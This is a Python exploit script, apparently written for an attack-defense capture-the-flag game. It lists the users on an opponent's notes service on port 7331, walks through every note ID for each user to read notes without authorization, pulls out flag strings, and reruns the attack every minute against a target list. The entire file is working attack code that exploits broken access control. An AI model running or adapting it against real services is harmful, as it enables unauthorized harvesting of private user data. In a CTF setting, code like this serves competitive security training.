import urllib.parse
import requests
from bs4 import BeautifulSoup

from scrape_users import get_user_list
from flag_utils import check_flag
from exploit_runtime import exp_runtime


def exploit(opponent_ip):
    base_url = f"http://{opponent_ip}:7331/"
    users = get_user_list(base_url)
    flags = set()
    for username in users:
        error, note_id = False, 0
        while not error:
            url = urllib.parse.urljoin(base_url, f"/notes/{username}/{note_id}")
            res = requests.get(url)
            soup = BeautifulSoup(res.text, 'html.parser')
            try:
                content = soup.find_all('p')[0].text
                new_flags = set(check_flag(content))
                flags = flags.union(new_flags)
                note_id += 1
            except IndexError:
                error = True
    return flags


if __name__ == "__main__":
    opponents = ["127.0.0.1"]
    exp_runtime(exploit, opponents, sleep_time=60)
